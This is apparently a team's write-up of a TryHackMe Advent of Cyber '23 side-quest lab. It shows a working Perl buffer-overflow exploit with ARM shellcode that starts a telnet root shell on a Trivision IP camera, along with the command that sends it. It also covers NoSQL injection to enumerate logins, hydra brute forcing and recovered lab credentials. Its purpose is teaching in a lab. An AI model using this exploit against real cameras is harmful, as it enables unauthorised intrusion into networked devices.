# Snowy ARMageddon (THM Advent of Cyber '23 Side Quest 1 Difficulty: Insane)

This was a team effort with 4 other THM Discord members. 

## Finding the QR Code

To find the QR code that leads to this challenge you need to play the game in Day 6 (Memory corruption, Memories of Christmas Past) of [THM Advent of Cyber '23](https://tryhackme.com/room/adventofcyber2023). 
1. First you need to figure out that you can acquire a white yeti ornament by overflowing the buffer with the letter a in the inventory section.
<p align="left">
  <img height=50 img src=./readme_assets/white-yeti.PNG/>
</p>
2. Go back to the shopkeeper and he will tell you the yeti is a fake but you can buy a real blue yeti if you have enough coins. Apparently you don't have enough.
3. Figure out what the max amount of coins you can get using the ascii characters on your keyboard. (4 tildes `~~~~`)
4. Overflow the buffer with the 4 tildes and go back to the shopkeeper. He will trade your white yeti for the blue yeti.
<p align="left">
  <img height=50 img src=./readme_assets/blue-yeti.PNG/>
</p>
5. Once you have the blue yeti, a new character will appear in the game. Let's call him Glitch. Go to Glitch and have a conversation. Take note of the hints and instructions he is giving you.
<p align="left">
  <img height=200 img src=./readme_assets/capture.PNG/>
</p>
<p align="left">
  <img height=135 img src=./readme_assets/message0.PNG/>
</p>
<p align="left">
  <img height=130 img src=./readme_assets/message01.PNG/>
</p>
<p align="left">
  <img height=125 img src=./readme_assets/message.PNG/>
</p>
<p align="left">
  <img height=150 img src=./readme_assets/message2.PNG/>
</p>
6. You need to overflow the buffer with all of the conditions met. To get exactly 31337 coins use iz in the coin section.
<p align="left">
  <img height=300 img src=./readme_assets/correct.PNG/>
</p>
7. Once you have the buffer correct you need to do the `30 Lives Code` moves. I had to google it.
`30 Lives - Highlight the number of players, and then press ***UP, UP, DOWN, DOWN, LEFT, RIGHT, LEFT, RIGHT, B, A***`
8. The game will completely glitch. At that point you will be able to roam around until you find the QR code.
<p align="left">
  <img height=300 img src=./readme_assets/QR.PNG/>
</p>
9. Scan the QR code and you are in! Welcome to [Snowy ARMageddon](https://tryhackme.com/room/armageddon2r)!

## Snowy ARMageddon Introduction

<p align="left">
  <img height=500 img src=./readme_assets/challenge.PNG/>
</p>

Ho ho, lads and lasses! Van Spy's whispers are golden! By pickin' apart the packet data we've sniffed out a mysterious device in the CyberPolice building. Seems like this old thing's been forgotten in their tech upgrade blizzard. It's as neglected as a lone iceberg.

This clunky old device is a buzzin', ripe for the pickin'. If we can get our claws into this enigmatic device, we'll have ourselves a sly backdoor right into the CyberPolice's icy fortress. Imagine the treasure troves of secrets just waitin' to be plundered! And oh, the cherry on top – we might just finagle our way into Frost-eau's laptop. That'll spill the beans on this Best Festival Company and AntarctiCrafts merger. McSkidy, that clever elf who snagged me last time, ought to keep an eye over her shoulder!

Remember, though, nothin' in the South Pole comes easy. But am I, the Bandit Yeti, the one to back down from a challenge? Never! Let's roll up our sleeves and dive into this digital snowstorm. The Bandit Yeti don't wait for no winter!

#### The Yeti Hints! 

Alright, my frosty friend, it's time to gear up for a simulated red team engagement. Think like the Yeti – be stealthy, keep it low-profile. We're treadin' through digital snow here, so make sure to minimize any detectable noise. It's like stalkin' a penguin in a blizzard; you gotta be silent, you gotta be sneaky. Now, if you get noisy at any point, don't get all ruffled if you hit a wall and find yourself blocked. It happens to the best of us, even the Bandit Yeti. Sometimes you gotta backtrack to the start, rethink your strategy. It's all part of the icy dance.

Your main target? Access that internal-only web application. That's where the juicy stuff is hidden. Now, gettin' full privileges on the machine – that's a tasty bonus, but don't sweat it if it's out of reach. The key is to complete the mission without kickin' up a snowstorm.

Remember, this is all about bein' as silent as the falling snow and as cunning as the arctic fox. Ready? Let's dive into this digital blizzard and show 'em what the Bandit Yeti's made of!

You are give an IP address and 2 questions to answer.

*Question 1 - What is the content of the first flag?*
*Question 2 - What is the content of the `yetikey2.txt` file?*

## Task analysis

If you look at the header image for the challenge you will see several hints.

<p align="left">
  <img height=300 img src=./readme_assets/hints.png/>
</p>
 It shows a camera, a leaf, a police badge, and what looks like the memory buffer locations for the challenge to get into this room. The leaf is mongodb.

And this was posted in Discord.

<p align="left">
  <img height=300 img src=./readme_assets/thm-hint.png/>
</p>

## Enumeration

The first thing I did was run nmap on the IP address. 
```
***22/tcp** open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)*  
*| ssh-hostkey:*  
*| 3072 3a:6e:55:8a:7a:b3:2d:ce:16:7b:7b:23:08:76:1b:a1 (RSA)*  
*| 256 dd:43:aa:c1:21:6d:21:16:7b:c4:6a:40:af:d6:93:b4 (ECDSA)*  
*|_ 256 d9:93:b1:8a:17:34:6f:d8:17:5b:af:e8:2c:e0:2f:f5 (ED25519)*  
***23/tcp** open tcpwrapped*  
***8080/tcp** open http Apache httpd 2.4.57 ((Debian))*  
*|_http-title: TryHackMe | Access Forbidden - 403*  
*|_http-server-header: Apache/2.4.57 (Debian)*  
***50628/tcp** open tcpwrapped*  
*Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel*
```

We have several ports to check out. Let's start with the most obvious and go to port 8080 in a browser.

<p align="left">
  <img height=300 img src=./readme_assets/website-oops.png/>
</p>

Definitely an attack target.

Not enough info to get into SSH on 22.
Telnet on 23 kicks you right out.

Doing a -sV scan on port 50628 gives us "http://nc-227wf-hd-720p:50628/default.asp". With a little googling you find https://www.fracturelabs.com/posts/2016/security-camera-dynamic-analysis/. It looks like port 50628 is an IP security cam.

Going to the port in a browser `http:\\host:50628` gives us: 

<p align="left">
  <img height=300 img src=./readme_assets/cam.png/>
</p>

*Trivision NC-227WF HD 720P*

Click on either button brings you to a login screen. Another attack target. Researched default login `admin/1234` but it doesn't work.
We found several interesting articles [1](https://www.theregister.com/2016/11/30/iot_cameras_compromised_by_long_url/), [2](https://no-sec.net/arm-x-challenge-breaking-the-webs/) about using buffer overflow to hijack the camera. The cam is definitely vulnerable.

<p align="left">
  <img height=300 img src=./readme_assets/cam-vuln.png/>
</p>

http://host:50628/admin/login.asp also pops up a login without loading the site.

<p align="left">
  <img height=300 img src=./readme_assets/admin_loginasp.png/>
</p>

The team spent hours using hydra to try to brute force both the 8080 and 50628 logins with no luck. 

Up to this point, this is what the team found so far. I didn't detail the tons of research that ultimately led to dead ends.

```
  Ports
    22 - 
    23 - 
    8080 - 
    50628 - Trivision NC-227WF HD 720P
      172.18.0.3 - Internal web cam IP
      / forwards to /en/login.asp
        ENTER button: /form/liveRedirect?lang=en
          forwards to /en/player/mjpeg_vga.asp
        SETTING button /en/main.asp
  http://rh:8080
    /demo/
    /vendor/
      /autoload.php (0KB)
      /composer/ (PHP dependency manager)
        LICENSE
        installed.php (0KB)
        installed.json
          "url":"https://github.com/fabpot",
          "url":"https://github.com/Jean85/pretty-package-versions.git",
          "url":"https://github.com/mongodb/mongo-php-library.git",
          "url":"https://github.com/php-fig/log.git",
          "url":"https://github.com/symfony/polyfill"
          "url":"https://github.com/symfony/polyfill-php80.git",
          "url":"https://github.com/symfony/polyfill-php81.git",
      /mongodb/
        mongodb/mongodb/connect.php
          mongodb://127.0.0.1:27017
      /psr/
        /log/
      /symfony/ (PHP framework)
```
	  

## Solution

One of our team members ran across this [video](https://www.youtube.com/watch?v=Y1bFNZde33Q) which describes how to exploit the webcam and turn on telnet. From there we can telnet into the webcam.

Here is the exploit. 

```
#!/usr/bin/perl

$| = 1;
$libc = 0x40021000;

$shellcode = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x0b\x27\x24\x1b\x06\xa1\x08\xa2\x90\x1c\x04\xa3\xcc\x71\x54\x72\x1c\x80\x9c\x70\x16\xb4\x69\x46\x92\x1a\x18\x47\xff\xff\x0f\xeftelnetdX-l/bin/shX";
$buf = "A" x 284;
$buf .= pack("V", $libc + 0x00044684);

$req = "GET /form/liveRedirect?lang=${buf} HTTP/1.0\nHost: B${shellcode}\nUser-Agent: ARM/exploitlab\n\n";
print $req;
```	

Run `perl exploit.pl | nc host 50628`. After running the exploit code you will see:

```
HTTP/1.0 302 Redirect
Server: Webs
Date: Wed Dec 31 19:01:15 1969
Pragma: no-cache
Cache-Control: no-cache
Content-Type: text/html
Location: http://B���/�
                       '����qTr��p�iF�▒▒G���telnetdX-l/bin/shX/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�V@/player/mjpeg_vga.asp

<html><head></head><body>
                This document has moved to a new <a href="http://B���/�
                                                                       '����qTr��p�iF�▒▒G���telnetdX-l/bin/shX/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�V@/player/mjpeg_vga.asp">location</a>.
                Please update your documents to reflect the new location.
                </body></html>
```

Now run `telnet host 23` and we are inside the cam! 

Searching through the directories and files we found a username and password in /var/etc/umconfig.txt.

```
TABLE=users  
ROW=0  
**name=admin**  
**password=Y3tiStarCur!ouspassword=admin**  
group=administrators prot=0 disable=0
```

In your browser go to `http:\\host:50628`  
Use the login info to login and get the flag for Question 1.

<p align="left">
  <img height=300 img src=./readme_assets/flag1.PNG/>
</p>

One down and one to go!

There's a forbidden page on http://host:8080/login.php but if you access it using /login.php/ there's a login panel.

<p align="left">
  <img height=300 img src=./readme_assets/login2.PNG/>
</p>

A different team member ran across a [Nosql-MongoDB Injection script](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) that could be used to find usernames and passwords from the website.

Login Names: 

<p align="left">
  <img height=300 img src=./readme_assets/login-names.png/>
</p>

Passwords:
```
6Ne2HYXUovEIVOEQg2US  
7yIcnHu8HC6QCH1MCfHS  
advEpXUBKt3bZjk3aHLR  
h1y6zpVTOwGYoB95aRnk 
jlXUuZKIeCONQQIe92GZ  
rCwBuLJPNzmRGExQucTC  
tANd8qZ93sFHUBrJhdQj  
uwx395sm4GpVfqQ4dUDI  
E33v0lTuUVa1ct4sSed1  
F6Ymdyzx9C1QeNOcU7FD  
HoHoHacked  
JZwpMOTmDvVYDq3uSb3t  
NlJt6HBZBG3olEphq8gr  
ROpPXouppjXNf2pmmT0Q  
UZbIt6L41BmLeQJF0gAR 
WmLP5OZDiLos16Ie1owB
```

The passwords that match the usernames will redirect to the elf page which allows us to match up names to passwords.

```
Blizzardson - h1y6zpVTOwGYoB95aRnk  
Frostbite - WmLP5OZDiLos16Ie1owB  
Grinchowski - 7yIcnHu8HC6QCH1MCfHS  
Iciclevich - uwx395sm4GpVfqQ4dUDI  
Northpolinsky - jlXUuZKIeCONQQIe92GZ  
Scroogestein - UZbIt6L41BmLeQJF0gAR  
Tinselova - F6Ymdyzx9C1QeNOcU7FD
```
`HoHoHacked` did not match any names and is out of place with the other passwords.

After you login using the names and passwords you get redirected to 403, but if you open /index.php/anything you'll see a new page. Tried all logins and nothing really to see.

But, on the passwords side, the HoHoHacked makes sense and is more interesting.

If you go into Burpsuite you can injected `HoHoHacked` where the password is and it gives you the username `Frosteau`. Login using `Frosteau` and `HoHoHacked`, refresh the page, and you have the contents of yetikey2.txt. 

<p align="left">
  <img height=300 img src=./readme_assets/flag2.PNG/>
</p>





